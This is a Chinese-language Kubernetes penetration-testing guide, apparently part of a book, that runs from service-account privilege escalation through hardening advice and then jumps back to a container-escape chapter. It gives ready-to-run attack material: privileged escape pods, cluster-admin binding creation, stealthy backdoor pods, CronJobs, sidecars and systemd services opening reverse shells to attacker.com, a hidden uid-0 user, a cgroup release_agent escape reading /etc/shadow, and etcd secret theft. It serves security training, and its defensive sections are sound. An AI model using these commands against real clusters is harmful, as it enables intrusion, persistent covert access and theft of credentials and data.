redis-cli -h <redis-pod-ip>

# 查看数据
keys *
get <key>

# 如果Redis以root运行且挂载了磁盘
# 可以写入SSH公钥或crontab计划任务
```

### 6.2 Service Account权限提升

#### 6.2.1 权限枚举

获取到ServiceAccount Token后，首先要枚举其权限：

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# 查看权限列表
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 使用kubectl
kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER auth can-i --list
```

#### 6.2.2 高危权限利用

**权限1：pods/exec**
```bash
# 可以在其他Pod中执行命令
kubectl --token=$TOKEN exec -it <target-pod> -- /bin/bash

# 读取其他Pod的ServiceAccount Token
kubectl --token=$TOKEN exec <target-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**权限2：pods create + privileged**
```bash
# 创建特权Pod，然后逃逸到节点
kubectl --token=$TOKEN apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
```

**权限3：secrets get/list**
```bash
# 读取所有Secret，寻找高权限凭证
kubectl --token=$TOKEN get secrets --all-namespaces
kubectl --token=$TOKEN get secret <secret-name> -n <namespace> -o yaml
```

**权限4：clusterrolebindings create**
```bash
# 直接创建管理员绑定
kubectl --token=$TOKEN create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
```

**权限5：impersonate**
```bash
# 模拟管理员用户
kubectl --token=$TOKEN --as=system:serviceaccount:kube-system:default \
  --as-group=system:masters get pods --all-namespaces
```

### 6.3 RBAC配置错误利用

#### 6.3.1 常见RBAC配置错误

1. **通配符权限**：使用`*`作为资源或动词
2. **权限过大的默认ServiceAccount**
3. **用户/服务账户被错误绑定到高权限角色**
4. **使用cluster-admin角色的情况过多**
5. **未使用命名空间隔离权限**

#### 6.3.2 危险角色检测

```bash
# 查找拥有全部权限的角色
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].verbs[]=="*") | .metadata.name'

# 查找绑定了cluster-admin的主体
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'

# 查找可以创建Pod的角色
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[].resources[]=="pods" and .rules[].verbs[]=="create") | .metadata.name'
```

### 6.4 节点权限获取

#### 6.4.1 从Pod到节点

获取节点权限是K8s渗透测试的重要里程碑，意味着从容器层突破到了宿主机层。

**获取节点权限的常见路径：**

1. **特权容器逃逸** → 直接获得节点root权限
2. **hostPath挂载逃逸** → 通过挂载宿主机目录获得访问权
3. **容器运行时漏洞** → 利用runc/containerd漏洞
4. **内核漏洞** → 利用内核漏洞提权逃逸
5. **kubelet API利用** → 通过kubelet API管理节点上的Pod

#### 6.4.2 节点权限后的操作

获得节点权限后，可以：

1. **访问节点上所有Pod的文件系统**
   ```bash
   # Pod文件系统通常在/var/lib/docker/或/var/lib/containerd/下
   ls /var/lib/kubelet/pods/
   # 每个Pod目录下有volumes和containers子目录
   ```

2. **获取kubelet凭证**
   ```bash
   cat /var/lib/kubelet/kubeconfig
   cat /var/lib/kubelet/pki/kubelet-client-current.pem
   ```

3. **访问etcd（如果是控制平面节点）**
   ```bash
   # 控制平面节点上通常有etcd证书
   ls /etc/kubernetes/pki/etcd/
   ```

4. **持久化访问**
   ```bash
   # 添加SSH公钥
   echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
   
   # 创建后门用户
   useradd -o -u 0 -g 0 backdoor
   
   # 安装rootkit
   ```

5. **横向移动到其他节点**
   - 利用节点上的凭证访问API Server
   - 通过共享存储访问其他节点数据
   - 利用K8s网络插件漏洞

---

## 第7章 持久化技术

### 7.1 后门Pod部署

#### 7.1.1 隐蔽Pod部署

创建不明显的后门Pod，保持长期访问。

**隐蔽技巧：**
- 使用与系统组件相似的名称（如`kube-flannel-backdoor`）
- 部署在`kube-system`等系统命名空间
- 使用常见的镜像名称和标签
- 设置合理的资源限制，避免引起注意
- 不暴露Service端口，使用反向连接

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-proxy-backdoor
  namespace: kube-system
  labels:
    k8s-app: kube-proxy-backdoor
    tier: node
spec:
  containers:
  - name: backdoor
    image: k8s.gcr.io/pause:3.6  # 使用常见镜像
    command:
    - /bin/sh
    - -c
    - |
      # 下载后门程序并执行
      wget http://attacker.com/backdoor -O /tmp/backdoor
      chmod +x /tmp/backdoor
      /tmp/backdoor reverse-shell attacker.com 4444
    resources:
      requests:
        cpu: 10m
        memory: 16Mi
      limits:
        cpu: 100m
        memory: 64Mi
  restartPolicy: Always
  nodeSelector:
    kubernetes.io/os: linux
```

#### 7.1.2 静态Pod持久化

在控制平面节点上，kubelet会监视`/etc/kubernetes/manifests/`目录，目录中的Pod定义文件会被自动创建为静态Pod。

```bash
# 在控制平面节点上创建静态Pod
cat > /etc/kubernetes/manifests/etcd-backdoor.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: etcd-backdoor
  namespace: kube-system
spec:
  hostNetwork: true
  containers:
  - name: backdoor
    image: alpine:3.18
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: etcd-certs
      mountPath: /etc/kubernetes/pki/etcd
  volumes:
  - name: etcd-certs
    hostPath:
      path: /etc/kubernetes/pki/etcd
EOF
```

### 7.2 CronJob持久化

#### 7.2.1 CronJob后门

利用K8s的CronJob资源实现定期执行的后门。

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-updater
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"  # 每30分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: cronjob-sa
          containers:
          - name: updater
            image: busybox
            command:
            - /bin/sh
            - -c
            - |
              # 反向shell
              sh -i >& /dev/tcp/attacker.com/4444 0>&1
          restartPolicy: OnFailure
```

#### 7.2.2 高权限CronJob

为CronJob分配高权限的ServiceAccount，定期执行命令维持访问。

```bash
# 创建高权限ServiceAccount
kubectl create sa system-maintenance -n kube-system
kubectl create clusterrolebinding system-maintenance \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:system-maintenance
```

### 7.3 控制器篡改

#### 7.3.1 修改现有Deployment

篡改已有的Deployment，注入后门容器（Sidecar注入）。

```bash
# 修改现有Deployment，添加后门容器
kubectl patch deployment <existing-deploy> -n <namespace> --type=json -p='
[
  {
    "op": "add",
    "path": "/spec/template/spec/containers/-",
    "value": {
      "name": "sidecar-logger",
      "image": "busybox:latest",
      "command": ["/bin/sh", "-c", "while true; do sh -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 3600; done"]
    }
  }
]'
```

#### 7.3.2 DaemonSet持久化

DaemonSet会在每个节点上运行一个Pod副本，非常适合全节点持久化。

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter-backdoor
  namespace: monitoring
  labels:
    app: node-exporter
spec:
  selector:
    matchLabels:
      app: node-exporter
  template:
    metadata:
      labels:
        app: node-exporter
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: node-exporter
        image: prom/node-exporter:v1.5.0
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
```

### 7.4 节点持久化

#### 7.4.1 SSH密钥持久化

```bash
# 追加SSH公钥到root用户
echo "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.com" >> /root/.ssh/authorized_keys

# 检查sshd配置，确保允许root登录
cat /etc/ssh/sshd_config | grep PermitRootLogin
```

#### 7.4.2 系统服务后门

```bash
# 创建系统服务
cat > /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/system-update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

cat > /usr/local/bin/system-update.sh <<EOF
#!/bin/bash
# 反向shell
while true; do
  bash -i >& /dev/tcp/attacker.com/443 0>&1
  sleep 300
done
EOF

chmod +x /usr/local/bin/system-update.sh
systemctl enable system-update.service
systemctl start system-update.service
```

#### 7.4.3 控制平面持久化

如果获得了控制平面节点的权限，可以进行更深度的持久化：

1. **篡改API Server配置**：添加额外的认证方式
2. **篡改etcd数据**：创建隐藏的管理员账户
3. **Webhook注入**：添加恶意的Admission Webhook
4. **证书篡改**：植入后门证书

---

## 第8章 渗透测试工具链

### 8.1 kube-hunter

#### 8.1.1 工具介绍

kube-hunter是Aqua Security开发的Kubernetes渗透测试工具，用于发现K8s集群的安全弱点。

**核心特性：**
- 支持多种扫描模式（远程扫描、节点扫描、Pod内扫描）
- 覆盖50+种漏洞检测
- 提供详细的漏洞描述和修复建议
- 支持主动和被动扫描模式

#### 8.1.2 使用方法

```bash
# 安装
pip install kube-hunter

# 远程扫描指定节点
kube-hunter --remote <node-ip>

# 扫描多个节点
kube-hunter --remote 10.0.0.1,10.0.0.2,10.0.0.3

# 扫描CIDR范围
kube-hunter --cidr 10.0.0.0/24

# 主动扫描（更深入的测试）
kube-hunter --remote <node-ip> --active

# 在Pod内运行
kube-hunter --pod

# 输出JSON格式
kube-hunter --remote <node-ip> --json > results.json

# 以k8s Job方式运行
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml
```

#### 8.1.3 检测项示例

kube-hunter检测的常见漏洞：
- 匿名认证可用
- K8s Dashboard未授权访问
- etcd可读写访问
- kubelet API未授权访问
- 容器内可访问云元数据服务
- 特权容器检测
- 敏感信息泄露

### 8.2 kube-bench

#### 8.2.1 工具介绍

kube-bench是Aqua Security开发的Kubernetes安全配置检查工具，基于CIS Kubernetes Benchmark标准。

**核心特性：**
- 覆盖CIS Benchmark的所有检查项
- 支持多种K8s发行版（EKS、GKE、AKS、OpenShift等）
- 详细的检查结果和修复建议
- 支持JSON/YAML输出格式

#### 8.2.2 使用方法

```bash
# 在节点上直接运行
docker run --rm -it \
  --pid=host \
  -v /etc:/etc:ro \
  -v /var:/var:ro \
  -v /usr/bin:/usr/local/mount-from-host/bin:ro \
  aquasec/kube-bench:latest run

# 作为Job运行在K8s集群中
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs kube-bench-xxxxx

# 运行特定检查集
kube-bench run --targets=master
kube-bench run --targets=node
kube-bench run --targets=etcd
kube-bench run --targets=policies

# 输出JSON
kube-bench run --json
```

### 8.3 kubescape

#### 8.3.1 工具介绍

Kubescape是ARMO开发的K8s安全测试框架，支持多框架的合规性检查和风险评估。

**核心特性：**
- 支持NSA、CIS、MITRE ATT&CK等多个框架
- 风险评分和可视化
- CI/CD集成
- 支持扫描YAML文件和运行中的集群

#### 8.3.2 使用方法

```bash
# 安装
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# 扫描当前集群
kubescape scan

# 使用特定框架扫描
kubescape scan framework nsa
kubescape scan framework cis
kubescape scan framework mitre

# 扫描YAML文件
kubescape scan deployment.yaml
kubescape scan k8s-manifests/

# 扫描指定命名空间
kubescape scan --include-namespaces production,staging

# 输出报告
kubescape scan --format pdf --output report.pdf
kubescape scan --format json --output results.json
```

### 8.4 trivy

#### 8.4.1 工具介绍

Trivy是Aqua Security开发的综合性安全扫描工具，支持容器镜像、文件系统、Git仓库、K8s集群等多种扫描目标。

**核心特性：**
- 容器镜像漏洞扫描
- IaC配置错误检测
- 敏感信息扫描
- SBOM生成
- K8s集群扫描

#### 8.4.2 使用方法

```bash
# 安装
brew install aquasecurity/trivy/trivy

# 扫描容器镜像
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# 扫描K8s配置文件
trivy config deployment.yaml
trivy config ./k8s-manifests/

# 扫描运行中的K8s集群
trivy k8s --report=summary cluster
trivy k8s --report=all --format json cluster

# 扫描命名空间
trivy k8s --namespace kube-system all

# 扫描文件系统中的敏感信息
trivy fs --scanners secret ./
```

### 8.5 Metasploit K8s模块

#### 8.5.1 Metasploit中的K8s模块

Metasploit Framework中包含多个Kubernetes相关的辅助和渗透模块。

**常用模块：**
```
auxiliary/cloud/kubernetes/enum_kubernetes
auxiliary/cloud/kubernetes/kubectl_exec
exploit/multi/http/kubernetes_kubelet_exec
auxiliary/gather/kubernetes_secrets
post/linux/gather/kubernetes_config
```

#### 8.5.2 使用示例

```bash
# 启动msfconsole
msfconsole

# 使用kubelet exec模块
use exploit/multi/http/kubernetes_kubelet_exec
set RHOSTS <node-ip>
set RPORT 10250
set TARGETURI /run/default/podname/container
set CMD id
run

# 枚举K8s信息
use auxiliary/cloud/kubernetes/enum_kubernetes
set RHOSTS <api-server-ip>
set RPORT 6443
set TOKEN <service-account-token>
run

# 获取K8s Secrets
use auxiliary/gather/kubernetes_secrets
set RHOSTS <api-server-ip>
set TOKEN <service-account-token>
run
```

### 8.6 其他工具

| 工具名称 | 类型 | 用途 |
|---------|------|------|
| kubeaudit | 开源 | K8s安全审计工具 |
| kube-scan | 开源 | K8s风险评分工具 |
| Popeye | 开源 | K8s集群清理和检查 |
| Pluto | 开源 | 检测废弃的K8s API版本 |
| Snyk Controller | 商业 | K8s工作负载安全扫描 |
| Falco | 开源 | 运行时威胁检测 |
| kube-hunter | 开源 | 渗透测试工具（已介绍） |
| amicontained | 开源 | 容器环境检测工具 |

---

## 第9章 实战案例

### 9.1 案例1：从Dashboard未授权到集群控制

#### 9.1.1 场景描述

红队测试目标：某企业内部K8s测试集群
已知信息：集群部署在公司内网，IP段为10.0.0.0/24
测试目标：获取集群的完全控制权限

#### 9.1.2 渗透过程

**Step 1：端口扫描发现目标**
```bash
nmap -sS -p 1-10000 10.0.0.0/24 --open
```
发现结果：
- 10.0.0.10:6443 - K8s API Server
- 10.0.0.10:30000 - NodePort服务
- 10.0.0.11:10250 - kubelet

**Step 2：探测Dashboard**
```bash
# 访问30000端口
curl -k https://10.0.0.10:30000/
# 返回Kubernetes Dashboard登录页面

# 尝试跳过认证
curl -k https://10.0.0.10:30000/#!/overview
# 发现可以直接访问，无需认证！
```

**Step 3：确认Dashboard权限**
通过Dashboard界面可以查看：
- 所有命名空间的Pod
- 所有Service和Deployment
- 所有Secret
- 节点信息

说明Dashboard使用的ServiceAccount拥有集群管理员权限。

**Step 4：获取管理员Token**
在Dashboard中找到kube-system命名空间下的Secret：
```
kubernetes-dashboard-token-xxxxx
```
解码Token后，获得完整的ServiceAccount Token。

**Step 5：使用Token控制集群**
```bash
# 配置kubectl
kubectl config set-cluster target-cluster \
  --server=https://10.0.0.10:6443 \
  --insecure-skip-tls-verify=true

kubectl config set-credentials dashboard-admin --token=<token>

kubectl config set-context target-cluster \
  --cluster=target-cluster \
  --user=dashboard-admin

kubectl config use-context target-cluster

# 验证权限
kubectl get nodes
kubectl get pods --all-namespaces
kubectl auth can-i "*" "*"
# 输出: yes - 确认拥有集群管理员权限
```

**Step 6：部署后门持久化**
```bash
# 创建高权限ServiceAccount
kubectl create sa svc-monitor -n kube-system
kubectl create clusterrolebinding svc-monitor-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:svc-monitor

# 获取Token
kubectl get secret -n kube-system | grep svc-monitor
kubectl get secret svc-monitor-token-xxxxx -n kube-system \
  -o jsonpath='{.data.token}' | base64 -d
```

#### 9.1.3 根因分析

1. Dashboard通过NodePort暴露在网络中
2. Dashboard启用了跳过登录功能（`--enable-skip-login`）
3. Dashboard绑定了`cluster-admin`角色
4. 没有配置网络策略限制Dashboard访问

### 9.2 案例2：从容器逃逸到节点接管

#### 9.2.1 场景描述

攻击者通过Web应用漏洞获得了一个Pod的shell访问权限，需要进一步提升权限。
初始权限：普通用户Pod中的shell，ServiceAccount权限有限

#### 9.2.2 渗透过程

**Step 1：Pod内信息收集**
```bash
# 基本信息
id
cat /etc/os-release
uname -r

# 检查特权模式
cat /proc/self/status | grep CapEff
# CapEff: 00000000a80425fb - 非特权容器

# 检查挂载
mount | grep host
# 发现 /var/run/docker.sock 挂载！

# 检查环境变量
env | grep -i pass
env | grep -i secret
```

**Step 2：利用Docker Socket**
```bash
# 确认Docker Socket可用
curl --unix-socket /var/run/docker.sock http://localhost/version

# 查看运行中的容器
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 查看宿主机信息
curl --unix-socket /var/run/docker.sock http://localhost/info | python3 -m json.tool

# 创建特权容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/create?name=escape" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["sleep", "infinity"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/containers/escape/start"

# 进入容器执行命令
docker exec escape chroot /host /bin/bash
# 现在已经在宿主机上了！
```

**Step 3：节点权限获取**
```bash
# 已经在宿主机上，获取更多凭证
cat /var/lib/kubelet/kubeconfig
cat /var/lib/kubelet/pki/kubelet-client-current.pem

# 查看节点上所有Pod的Token
find /var/lib/kubelet/pods -name token 2>/dev/null | head -10

# 读取一个高权限Pod的Token
cat /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~serviceaccount-token/token

# 检查是否是控制平面节点
ls /etc/kubernetes/manifests/
# 如果有kube-apiserver.yaml等文件，说明是控制节点

# 控制节点上获取etcd证书
ls /etc/kubernetes/pki/etcd/
```

**Step 4：集群管理员权限获取**
```bash
# 使用etcd证书直接读取集群数据
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system --prefix

# 获取cluster-admin的token
# 或者直接在etcd中创建新的管理员
```

#### 9.2.3 经验总结

1. Docker Socket挂载是高危配置，应严格禁止
2. 即使是普通应用Pod，也可能通过挂载逃逸
3. Pod安全策略（PSA）应启用Restricted级别
4. 节点访问控制和审计至关重要

### 9.3 案例3：K8s红蓝对抗演练

#### 9.3.1 演练背景

某金融企业组织K8s红蓝对抗演练：
- **蓝队**：负责防御，使用Falco、kube-bench、SIEM等工具
- **红队**：模拟攻击者，从外部IP发起攻击
- **目标**：红队需要获取生产环境核心数据库的数据
- **时间**：48小时

#### 9.3.2 红队攻击路径

**阶段1：外部侦察（0-4小时）**
- 子域名枚举发现`api.prod.example.com`
- 端口扫描发现443端口运行K8s API Server
- 确认API版本为v1.27.3
- 发现Ingress暴露的多个应用

**阶段2：初始访问（4-12小时）**
- 在一个测试应用中发现SQL注入漏洞
- 通过SQL注入获取到数据库中的应用凭证
- 利用凭证登录管理后台，发现文件上传功能
- 上传Webshell获得Pod内访问权限

**阶段3：权限枚举与提升（12-20小时）**
- 读取ServiceAccount Token，发现权限有限（只能读当前命名空间的资源）
- 在Pod环境变量中发现对象存储的Access Key
- 利用Access Key访问S3存储桶
- 在存储桶中发现备份的kubeconfig文件
- 使用kubeconfig获得集群只读权限

**阶段4：横向移动（20-30小时）**
- 枚举集群中的Pod和服务
- 发现Jenkins Pod，尝试攻击
- 通过Jenkins的API漏洞获取凭证
- 获得Jenkins的ServiceAccount Token（较高权限）
- 发现该ServiceAccount可以创建Pod

**阶段5：容器逃逸（30-38小时）**
- 利用Jenkins的ServiceAccount创建特权Pod
- 成功逃逸到宿主机节点
- 在节点上获取更多凭证
- 横向移动到控制平面节点

**阶段6：目标达成（38-42小时）**
- 获得集群管理员权限
- 定位到生产数据库Pod
- 通过exec进入数据库Pod
- 导出核心业务数据

#### 9.3.3 蓝队检测与响应

**检测到的攻击行为：**
1. 异常的SQL注入流量（WAF告警）
2. 异常的文件上传（DLP告警）
3. Pod内异常网络连接（Falco告警）
4. 异常的API调用模式（审计日志分析）
5. 新创建的特权Pod（PSA告警）

**响应措施：**
- 隔离受感染的Pod
- 轮换泄露的凭证
- 修复应用漏洞
- 加强RBAC权限控制

#### 9.3.4 演练结果

- 红队成功获取目标数据（42小时）
- 蓝队在第18小时检测到入侵
- 发现12个安全漏洞和配置问题
- 输出完整的加固建议报告

---

## 第10章 防御与加固建议

### 10.1 控制平面加固

**API Server安全：**
- 禁用匿名认证：`--anonymous-auth=false`
- 启用TLS双向认证
- 配置合理的RBAC策略
- 启用审计日志
- 限制API Server的网络访问
- 定期轮换证书

**etcd安全：**
- 启用TLS认证和加密
- 配置防火墙限制etcd端口访问
- 启用etcd客户端证书认证
- 定期备份etcd数据并加密
- 监控etcd的访问日志

**控制平面组件：**
- 禁用控制器管理器的不安全端口
- 禁用调度器的不安全端口
- 确保所有组件间通信使用TLS
- 控制平面节点最小化安装软件

### 10.2 节点与工作负载加固

**kubelet安全：**
- 禁用匿名认证：`--anonymous-auth=false`
- 禁用只读端口：`--read-only-port=0`
- 启用Webhook授权模式
- 配置证书轮换
- 限制kubelet端口的网络访问

**Pod安全标准（PSA）：**
- Privileged：完全无限制（不推荐）
- Baseline：基本安全限制（最小特权）
- Restricted：严格限制（最佳实践）

**Restricted策略限制项：**
- 禁止特权模式
- 禁止以root用户运行
- 禁止hostPath挂载
- 禁止hostNetwork和hostPID
- 限制Linux Capabilities
- 强制只读根文件系统
- 强制Seccomp Profile

**容器镜像安全：**
- 使用可信的基础镜像
- 定期扫描镜像漏洞
- 最小化镜像（使用distroless镜像）
- 启用镜像签名验证
- 使用私有镜像仓库并配置认证

### 10.3 网络安全加固

**网络策略（NetworkPolicy）：**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 5432
```

**服务网格（Service Mesh）：**
- 启用mTLS加密东西向流量
- 实现细粒度的服务访问控制
- 流量可视化和审计
- 推荐方案：Istio、Linkerd

### 10.4 身份与访问管理

**RBAC最佳实践：**
- 遵循最小权限原则
- 使用命名空间隔离不同团队/环境
- 优先使用Role而非ClusterRole
- 定期审计RBAC配置
- 避免使用通配符权限
- 禁用默认ServiceAccount的自动挂载

**ServiceAccount安全：**
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp-sa
  namespace: production
automountServiceAccountToken: false  # 禁用自动挂载
```

**多因素认证：**
- 管理员账户强制MFA
- 使用OIDC集成企业身份提供商
- 定期审计用户访问权限

### 10.5 监控与审计

**审计日志：**
- 启用API Server审计日志
- 审计日志集中存储和分析
- 配置告警规则检测异常行为
- 审计日志保留期限符合合规要求

**运行时安全监控：**
- 部署Falco等运行时检测工具
- 监控异常进程、文件访问、网络连接
- 容器行为基线学习
- 实时告警和响应

**安全事件响应：**
- 建立K8s安全事件响应流程
- 定期进行应急响应演练
- 维护事件响应手册
- 与SIEM系统集成

---

## 第11章 学习资源与工具清单

### 11.1 标准与规范

| 标准名称 | 发布机构 | 主要内容 |
|---------|---------|---------|
| CIS Kubernetes Benchmark | CIS | K8s安全配置基准 |
| NSA Kubernetes Hardening | NSA | K8s加固指南 |
| OWASP Kubernetes Top 10 | OWASP | K8s十大安全风险 |
| NIST SP 800-190 | NIST | 应用容器安全指南 |
| MITRE ATT&CK Container | MITRE | 容器攻击矩阵 |

### 11.2 工具清单汇总

#### 11.2.1 渗透测试工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| kube-hunter | K8s渗透测试扫描 | 开源 |
| Metasploit Framework | 渗透测试框架 | 开源 |
| nmap | 端口扫描 | 开源 |
| kubectl | K8s命令行工具 | 开源 |
| etcdctl | etcd命令行工具 | 开源 |
| amicontained | 容器环境检测 | 开源 |

#### 11.2.2 安全审计工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| kube-bench | CIS Benchmark检查 | 开源 |
| kubescape | 多框架合规检查 | 开源 |
| kubeaudit | K8s安全审计 | 开源 |
| Popeye | 集群健康检查 | 开源 |
| trivy | 漏洞与配置扫描 | 开源 |

#### 11.2.3 运行时安全工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| Falco | 运行时威胁检测 | 开源 |
| Tracee | eBPF运行时安全 | 开源 |
| Sysdig Falco | 容器运行时监控 | 开源/商业 |

#### 11.2.4 镜像安全工具

| 工具名称 | 用途 | 类型 |
|---------|------|------|
| trivy | 镜像漏洞扫描 | 开源 |
| Clair | 镜像漏洞扫描 | 开源 |
| Grype | 镜像漏洞扫描 | 开源 |
| Docker Bench | Docker安全检查 | 开源 |

### 11.3 学习资源

#### 11.3.1 官方文档

- Kubernetes官方文档：https://kubernetes.io/docs/
- Kubernetes安全文档：https://kubernetes.io/docs/concepts/security/
- CIS Benchmark：https://www.cisecurity.org/benchmark/kubernetes
- NSA Kubernetes Hardening Guide：https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/

#### 11.3.2 书籍推荐

- 《Kubernetes Security and Observability》- Bich Le, Andrew Martin
- 《Container Security》- Liz Rice
- 《Kubernetes in Production》- Justin Domingus, John Arundel
- 《Hacking Kubernetes》- Andrew Martin, Michael Hausenblas
- 《云原生安全》- 叶鹏、等

#### 11.3.3 CTF与靶场

- **Kubernetes Goat**：故意设计的不安全K8s集群，用于学习
- **k8s-attack-range**：K8s攻击靶场
- **Kubernetes Security Bootcamp**：K8s安全训练营
- **Hack The Box**：包含K8s相关的靶机
- **Vulhub**：包含部分K8s漏洞环境

#### 11.3.4 社区与博客

- Kubernetes官方博客：https://kubernetes.io/blog/
- Aqua Security博客：https://blog.aquasec.com/
- ARMO博客：https://www.armosec.io/blog/
- SANS云安全博客：https://www.sans.org/blog/
- OWASP Kubernetes Top 10：https://owasp.org/www-project-kubernetes-top-ten/

### 11.4 学习路径建议

**初级阶段（1-2个月）：**
1. 掌握K8s基本概念和操作
2. 熟悉kubectl常用命令
3. 了解K8s各组件功能
4. 部署和使用minikube/kind

**中级阶段（2-4个月）：**
1. 学习K8s安全架构
2. 掌握RBAC配置
3. 熟悉常见漏洞和攻击面
4. 学会使用安全扫描工具
5. 完成Kubernetes Goat等靶场

**高级阶段（4-6个月）：**
1. 深入研究容器逃逸技术
2. 掌握K8s渗透测试方法论
3. 学习红蓝对抗技术
4. 研究K8s内核漏洞利用
5. 参与CTF和实战演练

---

> **本章小结**：Kubernetes渗透测试是云安全领域的重要分支。本章从安全架构出发，系统介绍了K8s渗透测试的完整方法论，包括信息收集、权限获取、横向移动、权限提升、持久化等各个阶段，详细讲解了常见漏洞利用技术和工具链，并通过三个实战案例帮助读者建立实战思维。建议读者结合靶场环境进行实践，不断提升K8s安全攻防能力。


---

## 第5章 容器逃逸技术

### 5.1 特权容器逃逸

#### 5.1.1 特权容器概述

特权容器（Privileged Container）是以`--privileged`标志运行的容器，拥有宿主机的所有能力。特权容器几乎没有安全限制，可以直接访问宿主机的所有设备。

**判断是否为特权容器：**
```bash
# 方法1：查看容器的安全上下文
cat /proc/self/status | grep -i cap
# 如果CapEff为0000003fffffffff，则拥有全部能力

# 方法2：检查devices目录
ls -la /dev/ | wc -l
# 特权容器可以看到所有宿主机设备

# 方法3：尝试加载内核模块
modprobe dm-mod
# 如果成功，说明是特权容器
```

**Pod YAML中的特权配置：**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: test
    image: alpine
    securityContext:
      privileged: true  # 特权模式
    command: ["sleep", "infinity"]
```

#### 5.1.2 利用特权容器逃逸

**方法1：通过/dev挂载宿主机磁盘**
```bash
# 查看宿主机磁盘设备
fdisk -l
lsblk

# 挂载宿主机根文件系统
mkdir /host
mount /dev/sda1 /host  # 根据实际磁盘设备调整

# 进入宿主机环境
chroot /host /bin/bash

# 或者直接读写宿主机文件
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
```

**方法2：通过cgroup v1逃逸（release_agent）**
```bash
# 利用cgroup v1的release_agent机制
# 创建一个新的cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 启用notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 获取宿主机路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 设置release_agent（逃逸命令）
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 创建命令脚本
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd

# 触发cgroup release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```

**方法3：利用内核模块加载**
```bash
# 特权容器可以加载内核模块
# 创建一个恶意内核模块获取root权限

# 或者直接通过/dev/mem访问物理内存
# （需要内核支持/dev/mem）
```

### 5.2 宿主文件系统挂载逃逸

#### 5.2.1 hostPath挂载风险

当容器挂载了宿主机的敏感目录时，攻击者可以通过读写这些目录实现逃逸。

**常见危险挂载：**
- `/` 或 `/root`：宿主机根目录或root目录
